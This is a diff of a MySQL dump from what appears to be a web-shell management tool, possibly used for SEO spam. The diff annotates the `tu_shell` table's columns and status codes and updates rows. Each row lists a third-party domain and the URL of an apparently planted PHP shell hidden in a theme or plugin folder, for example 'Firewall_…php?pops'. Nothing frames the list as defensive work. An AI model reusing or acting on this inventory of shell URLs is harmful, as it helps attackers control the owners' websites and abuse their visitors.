@@ -407,27 +407,27 @@ insert  into `tu_products`(`id`,`orders_id`,`products_id`,`products_model`,`prod
 DROP TABLE IF EXISTS `tu_shell`;
 
 CREATE TABLE `tu_shell` (
-  `id` int(10) NOT NULL AUTO_INCREMENT,
-  `host` longtext,
-  `scheme` longtext,
-  `group_id` bigint(20) DEFAULT NULL,
-  `status` bigint(20) DEFAULT NULL,
-  `num` bigint(20) DEFAULT NULL,
-  `maxurl` longtext,
-  `minurl` longtext,
+  `id` int(10) NOT NULL AUTO_INCREMENT COMMENT 'id',
+  `host` text COMMENT '域名',
+  `scheme` varchar(200) DEFAULT NULL COMMENT '协议',
+  `group_id` bigint(20) DEFAULT NULL COMMENT '分组',
+  `status` bigint(20) DEFAULT NULL COMMENT '状态 0:待处理 1:正常 2:失效 3:人工处理 4:处理失败 5:网络问题',
+  `num` bigint(20) DEFAULT NULL COMMENT '0:没备 1:备小码 2:备大码',
+  `maxurl` longtext COMMENT '大码',
+  `minurl` longtext COMMENT '小码',
   `dir` bigint(20) DEFAULT NULL,
-  `lock` bigint(20) DEFAULT NULL,
-  `remark` longtext,
-  `addtime` bigint(20) DEFAULT NULL,
-  `uptime` bigint(20) DEFAULT NULL,
-  `sitenum` bigint(20) DEFAULT NULL,
+  `lock` bigint(20) DEFAULT NULL COMMENT '锁定 0:没锁 1:首页 2:全锁',
+  `remark` longtext COMMENT '备注',
+  `addtime` bigint(20) DEFAULT NULL COMMENT '添加时间',
+  `uptime` bigint(20) DEFAULT NULL COMMENT '更新时间',
+  `sitenum` bigint(20) DEFAULT NULL COMMENT '收录',
   PRIMARY KEY (`id`),
   KEY `id` (`id`)
 ) ENGINE=InnoDB AUTO_INCREMENT=36 DEFAULT CHARSET=utf8mb4 COMMENT='shell管理';
 
 /*Data for the table `tu_shell` */
 
-insert  into `tu_shell`(`id`,`host`,`scheme`,`group_id`,`status`,`num`,`maxurl`,`minurl`,`dir`,`lock`,`remark`,`addtime`,`uptime`,`sitenum`) values (9,'127.0.0.223','http',1,1,1,'http://127.0.0.223/wp-content/admin.php','admin.php',0,1,'',1741077073,1781248470,10),(15,'ergoneo.be','http',3,2,1,'http://ergoneo.be/core/cghmj.php?pops','admin.php',0,2,'',1776503217,1781601194,30),(23,'sina.com.cn','http',6,0,0,'http://sina.com.cn/sss.php','admin.php',0,0,'',1781663290,1781663290,0),(24,'jubatu.org','https',6,2,0,'https://jubatu.org/resources/vendor/gmaps/test/lib/github.php?pops','admin.php',0,0,'',1781663334,1781663334,0),(25,'katerinariga.gr','https',6,0,0,'https://katerinariga.gr/admin/language/en-gb/extension/extension/Y7Q5LqcFW2x.php?pops','admin.php',0,0,'',1781663347,1781663347,0),(26,'www.davidegiovagnoli.com','https',6,0,0,'https://www.davidegiovagnoli.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_Pz2inx.php?pops','admin.php',0,0,'',1781663364,1781663364,0),(27,'kaccsa.com','https',6,0,0,'https://kaccsa.com/plugins/content/jw_joomla/jw_joomla/includes/elements/Firewall_6JHKQx.php?pops','admin.php',0,0,'',1781663377,1781663377,0),(28,'modz.ch','http',6,0,0,'http://modz.ch/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_gMRuxx.php?pops','admin.php',0,0,'',1781663389,1781663389,0),(29,'www.k-financialservices.com','http',6,0,0,'http://www.k-financialservices.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_weAqDx.php?pops','admin.php',0,0,'',1781663402,1781663402,0),(30,'www.menwin.net','http',6,0,0,'http://www.menwin.net/wp-content/plugins/wptelegram-widget/includes/restApi/README.php?pop','admin.php',0,0,'',1781663525,1781663525,0),(31,'saqifamarketing.com','http',6,0,0,'http://saqifamarketing.com/_protected/tests/codeception/common/templates/fixtures/README.php?pops','admin.php',0,0,'',1781663539,1781663539,0),(32,'www.ryv-travel.com.ar','http',6,1,0,'http://www.ryv-travel.com.ar/includes/recaptcha/tests/ReCaptcha/RequestMethod/huTest.php.pif','admin.php',0,0,'',1781663553,1781663553,0),(33,'jestesskarbem.org','https',6,0,0,'https://jestesskarbem.org/plugins/content/jw_joomla/jw_joomla/includes/elements/fhujk.php?pops','admin.php',0,0,'',1781663562,1781663562,0),(34,'pilshellas.gr','https',6,0,0,'https://pilshellas.gr/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_rtZfSx.php?pops','admin.php',0,0,'',1781663575,1781663575,0),(35,'zaukovo.ru','http',6,0,0,'http://zaukovo.ru/plugins/content/jw_joomla/jw_joomla/includes/elements/sdga.php?pops','admin.php',0,0,'',1781663586,1781663586,0);
+insert  into `tu_shell`(`id`,`host`,`scheme`,`group_id`,`status`,`num`,`maxurl`,`minurl`,`dir`,`lock`,`remark`,`addtime`,`uptime`,`sitenum`) values (9,'127.0.0.223','http',1,2,1,'http://127.0.0.223/wp-content/admin.php','admin.php',0,1,'',1741077073,1781248470,10),(15,'ergoneo.be','http',3,2,1,'http://ergoneo.be/core/cghmj.php?pops','admin.php',0,2,'',1776503217,1781601194,30),(23,'sina.com.cn','http',6,5,0,'http://sina.com.cn/sss.php','admin.php',0,0,'',1781663290,1781663290,0),(24,'jubatu.org','https',6,2,0,'https://jubatu.org/resources/vendor/gmaps/test/lib/github.php?pops','admin.php',0,0,'',1781663334,1781663334,0),(25,'katerinariga.gr','https',6,5,0,'https://katerinariga.gr/admin/language/en-gb/extension/extension/Y7Q5LqcFW2x.php?pops','admin.php',0,0,'',1781663347,1781663347,0),(26,'www.davidegiovagnoli.com','https',6,1,0,'https://www.davidegiovagnoli.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_Pz2inx.php?pops','admin.php',0,0,'',1781663364,1781663364,0),(27,'kaccsa.com','https',6,1,0,'https://kaccsa.com/plugins/content/jw_joomla/jw_joomla/includes/elements/Firewall_6JHKQx.php?pops','admin.php',0,0,'',1781663377,1781663377,0),(28,'modz.ch','http',6,1,0,'http://modz.ch/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_gMRuxx.php?pops','admin.php',0,0,'',1781663389,1781663389,0),(29,'www.k-financialservices.com','http',6,5,0,'http://www.k-financialservices.com/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_weAqDx.php?pops','admin.php',0,0,'',1781663402,1781663402,0),(30,'www.menwin.net','http',6,5,0,'http://www.menwin.net/wp-content/plugins/wptelegram-widget/includes/restApi/README.php?pop','admin.php',0,0,'',1781663525,1781663525,0),(31,'saqifamarketing.com','http',6,5,0,'http://saqifamarketing.com/_protected/tests/codeception/common/templates/fixtures/README.php?pops','admin.php',0,0,'',1781663539,1781663539,0),(32,'www.ryv-travel.com.ar','http',6,1,0,'http://www.ryv-travel.com.ar/includes/recaptcha/tests/ReCaptcha/RequestMethod/huTest.php.pif','admin.php',0,0,'',1781663553,1781663553,0),(33,'jestesskarbem.org','https',6,5,0,'https://jestesskarbem.org/plugins/content/jw_joomla/jw_joomla/includes/elements/fhujk.php?pops','admin.php',0,0,'',1781663562,1781663562,0),(34,'pilshellas.gr','https',6,1,0,'https://pilshellas.gr/wp-content/themes/rosa2-lite/inc/admin/required-plugins/Firewall_rtZfSx.php?pops','admin.php',0,0,'',1781663575,1781663575,0),(35,'zaukovo.ru','http',6,1,0,'http://zaukovo.ru/plugins/content/jw_joomla/jw_joomla/includes/elements/sdga.php?pops','admin.php',0,0,'',1781663586,1781663586,0);
 
 /*Table structure for table `tu_shell_group` */
 
